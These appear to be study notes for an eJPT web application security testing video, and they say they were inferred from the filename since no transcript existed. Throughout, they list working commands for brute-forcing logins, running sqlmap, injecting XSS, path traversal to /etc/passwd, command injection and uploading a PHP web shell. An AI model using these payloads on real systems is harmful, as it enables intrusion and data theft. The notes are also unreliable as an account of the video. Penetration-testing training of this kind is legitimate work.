# What the video covers (Introduction / big picture)
Note: No transcript was provided. The following is a conservative, eJPT-aligned summary inferred from the filename and module context (“01-IntroductiontoWebAppSecurityTesting/03 - Web Application Security Testing.mp4”).

This video introduces a practical, black-box web application security testing workflow. It frames testing around mapping the application, discovering attack surface, and validating core web vulnerabilities the eJPT expects you to recognize and prove with minimal, well-scoped exploitation. You’ll see how to:
- Profile the target stack and enumerate content/endpoints
- Intercept/inspect HTTP traffic and identify parameters, sessions, and state
- Systematically test common weaknesses (auth/session issues, IDOR/BAC, input validation flaws like SQLi/XSS, file upload, path traversal/LFI, command injection)
- Use common tools (Burp/ZAP, nmap HTTP scripts, gobuster/ffuf, Nikto, sqlmap, curl) in a cohesive, repeatable flow

Emphasis is on safe, legal, and report-oriented testing with clear PoC evidence.

# Flow (ordered)
1. Scope and rules of engagement
   - Confirm legal authorization, targets, time windows, and exclusions.
2. Baseline probe and tech fingerprint
   - Grab headers, HTTP methods, TLS info, and tech fingerprints.
3. Content discovery and crawling
   - Enumerate directories/files, check robots/sitemaps, enumerate virtual hosts if in-scope.
4. Application mapping
   - Intercept traffic (Burp/ZAP), list parameters/endpoints, enumerate roles/workflows.
5. Authentication and session analysis
   - Test for weak creds, predictable cookies, missing flags, and session fixation/timeout.
6. Parameter and input testing
   - Fuzz GET/POST/JSON parameters and headers; identify reflective/storage points.
7. Vulnerability validation
   - IDOR/Broken Access Control, SQLi, XSS, path traversal/LFI, file upload bypass to RCE, command injection, CSRF basics.
8. Proof-of-concept and minimal exploitation
   - Demonstrate impact safely (non-destructive), collect screenshots/logs.
9. Document findings and cleanup
   - Note affected endpoints, payloads, reproduction steps, and remediation suggestions.

# Tools highlighted
- Burp Suite (Community) or OWASP ZAP: Intercept/replay requests, fuzz parameters, analyze session/cookies.
- nmap (HTTP NSE scripts): http-title, http-headers, http-methods, http-enum.
- whatweb / Wappalyzer: Technology fingerprinting.
- gobuster / ffuf (or dirsearch): Directory/file and vhost discovery.
- Nikto: Baseline web server misconfiguration/known issues.
- curl / wget / httpie: Quick HTTP checks, headers, method tests, scripted PoCs.
- sqlmap: SQL injection detection/exploitation.
- Seclists: Wordlists for content/parameter fuzzing.
- Optional: hydra (basic/form auth brute within scope), arjun (parameter discovery).

# Typical command walkthrough (detailed, copy-paste friendly)
Set target helpers (edit these first):
```bash
export TARGET=10.10.10.10
export BASE_URL=http://$TARGET
# For HTTPS with invalid certs (many labs): add -k to curl/gobuster/ffuf as needed
```

1) Baseline and fingerprinting
```bash
# Resolve and headers
curl -sI -L "$BASE_URL"

# Check robots and sitemap
curl -sL "$BASE_URL/robots.txt"
curl -sL "$BASE_URL/sitemap.xml"

# HTTP methods
curl -i -X OPTIONS "$BASE_URL"

# Tech fingerprint
whatweb "$BASE_URL"

# nmap HTTP scan (common web ports)
nmap -Pn -sV -p 80,443,8080,8443 --script http-title,http-server-header,http-headers,http-methods,http-enum "$TARGET"
```

2) Content discovery
```bash
# gobuster directory bruteforce with common extensions
gobuster dir -u "$BASE_URL" \
  -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
  -x php,asp,jsp,txt,html -t 50 -o gobuster.txt

# ffuf alternative with recursion
ffuf -u "$BASE_URL/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt \
  -e .php,.txt,.js,.html \
  -mc 200,204,301,302,307,401,403 \
  -recursion -recursion-depth 1 -t 50 \
  -of json -o ffuf-dir.json
```

3) Virtual host discovery (if in-scope and you have a hostname)
```bash
export HOST=target.local
ffuf -u "http://$TARGET" -H "Host: FUZZ.$HOST" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -mc 200,204,301,302,307,401,403 -t 50
```

4) Parameter discovery
```bash
# arjun (GET/POST parameter names)
arjun -u "$BASE_URL/index.php" -oT arjun.txt

# ffuf parameter name fuzzing via query
ffuf -u "$BASE_URL/search?FUZZ=test" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc 200,301,302,401,403 -t 50

# ffuf parameter name fuzzing via POST body
ffuf -u "$BASE_URL/api" -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "FUZZ=test" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc 200,201,204,301,302,401,403
```

5) Auth and session checks (only with explicit permission)
```bash
# Basic/ Digest protected directory brute (example)
hydra -L users.txt -P passwords.txt -f "$TARGET" http-get /admin/

# Form-based login (adjust field names and failure regex)
hydra -L users.txt -P passwords.txt "$TARGET" \
  http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"
```
In Burp, inspect:
- Cookies (HttpOnly/Secure/SameSite), session rotation on login, logout invalidation, and idle timeout.

6) SQL injection
Manual probes:
- Append to parameters: ' " ) OR 1=1-- -  ) AND SLEEP(5)-- -
- Look for DB error messages, boolean/time-based behavior.

sqlmap with URL:
```bash
sqlmap -u "$BASE_URL/items.php?id=1" --batch --risk=2 --level=2 --current-db
sqlmap -u "$BASE_URL/items.php?id=1" --batch --dbs
```
sqlmap with raw request (capture in Burp, save as request.txt):
```bash
sqlmap -r request.txt --batch --risk=2 --level=3 --dbs
# Enumerate further as needed:
# sqlmap -r request.txt -D targetdb --tables
# sqlmap -r request.txt -D targetdb -T users --dump
```

7) Cross-Site Scripting (XSS)
Quick payloads for reflections/forms/comments:
- <script>alert(1)</script>
- "><svg/onload=alert(1)>
- <img src=x onerror=alert(1)>
Use Burp Repeater to test parameters/headers (e.g., Referer, User-Agent) and observe context (HTML, attribute, JS).

8) Path traversal / LFI
```bash
# Linux
curl -s "$BASE_URL/view?file=../../../../etc/passwd" | head
# Windows
curl -s "$BASE_URL/view?file=..\\..\\..\\Windows\\win.ini" | head
# Encoded
curl -s "$BASE_URL/view?file=..%2f..%2f..%2f..%2fetc%2fpasswd" | head
```

9) Command injection (only in clearly vulnerable endpoints, e.g., ping/traceroute forms)
Try separators: ; && | ` $() 
```bash
# Example: param=127.0.0.1;id
curl -s "$BASE_URL/ping?host=127.0.0.1;id"
curl -s "$BASE_URL/ping" --data "host=127.0.0.1;whoami"
```

10) File upload testing
Create a minimal web shell (only in lab targets):
```bash
cat > shell.php << 'EOF'
<?php system($_GET['cmd'] ?? 'id'); ?>
EOF
```
Attempt upload (tweak field names and endpoint):
```bash
curl -s -F "file=@shell.php;type=image/jpeg" -F "submit=Upload" "$BASE_URL/upload.php" -i
# Then browse: http://TARGET/uploads/shell.php?cmd=id
```
Try double extensions (shell.php.jpg) and content-type tampering in Burp if filtered.

11) CSRF basics
Check if state-changing requests lack CSRF tokens. Minimal PoC template:
```html
<form action="http://TARGET/email/change" method="POST">
  <input type="hidden" name="email" value="attacker@example.com">
  <input type="submit" value="Submit">
</form>
```
Host locally and load in a browser with an authenticated session to validate.

12) HTTP security headers and cookies
```bash
curl -sI "$BASE_URL" | egrep -i "content-security-policy|x-frame-options|x-content-type-options|referrer-policy|strict-transport-security"
```

# Practical tips
- Always obtain explicit authorization; throttle requests to avoid disrupting production.
- Use Burp Proxy early; build a site map and list parameters/endpoints before fuzzing.
- Save raw requests for repeatability and tooling (Burp -> Save item; use with sqlmap -r).
- Prefer smaller wordlists first (raft-small-words.txt) to quickly find low-hanging fruit; expand only as needed.
- Calibrate ffuf/gobuster filters: compare a known 404 response size and filter with -fs or -fw; rely on -mc for status codes initially.
- Watch for JSON APIs; set correct Content-Type and test JSON keys too.
- Test headers where applicable (X-Forwarded-For, User-Agent, Referer) for injection/reflection.
- For auth brute, ensure scope allows it; set clear stop conditions (-f in hydra) and failure strings accurately.
- Validate IDOR/BAC by comparing responses with/without proper auth/roles; log evidence with timestamps and request IDs.
- Keep notes: affected URLs, parameters, payloads, responses, and remediation suggestions.

# Minimal cheat sheet (one-screen flow)
```bash
# 0) Setup
export TARGET=10.10.10.10; export BASE_URL=http://$TARGET

# 1) Baseline
curl -sI -L "$BASE_URL"; curl -sL "$BASE_URL/robots.txt"; curl -sL "$BASE_URL/sitemap.xml"
whatweb "$BASE_URL"
nmap -Pn -sV -p80,443,8080,8443 --script http-title,http-headers,http-methods,http-enum "$TARGET"

# 2) Discovery
gobuster dir -u "$BASE_URL" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php,txt,js,html -t 50 -o gobuster.txt
ffuf -u "$BASE_URL/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -e .php,.txt,.js -mc 200,204,301,302,401,403 -t 50

# 3) Params
arjun -u "$BASE_URL/index.php" -oT arjun.txt
ffuf -u "$BASE_URL/search?FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc 200,301,302

# 4) Methods and auth
curl -i -X OPTIONS "$BASE_URL"
# hydra examples (only if allowed):
# hydra -L users.txt -P passwords.txt "$TARGET" http-get /admin/
# hydra -L users.txt -P passwords.txt "$TARGET" http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"

# 5) SQLi
sqlmap -u "$BASE_URL/items.php?id=1" --batch --risk=2 --level=2 --dbs

# 6) XSS quick tests
# Inject into parameters/forms: <script>alert(1)</script>  "><svg/onload=alert(1)>

# 7) LFI / traversal
curl -s "$BASE_URL/view?file=../../../../etc/passwd" | head

# 8) Command injection (only if endpoint suggests OS commands)
curl -s "$BASE_URL/ping?host=127.0.0.1;whoami"

# 9) Upload (lab)
curl -s -F "file=@shell.php;type=image/jpeg" "$BASE_URL/upload.php" -i
```

# Summary
Without the transcript, this note outlines a practical eJPT-style web app testing workflow that starts with lawful scoping, fingerprints the target, discovers content and parameters, and then validates common vulnerabilities through safe, minimal PoCs. The toolset is intentionally lightweight (Burp/ZAP, nmap, whatweb, gobuster/ffuf, Nikto, curl, sqlmap) and the commands are copy-paste-ready with placeholders. Use this as a starting checklist and adapt payloads/filters to the specific application behavior you observe in your intercepting proxy.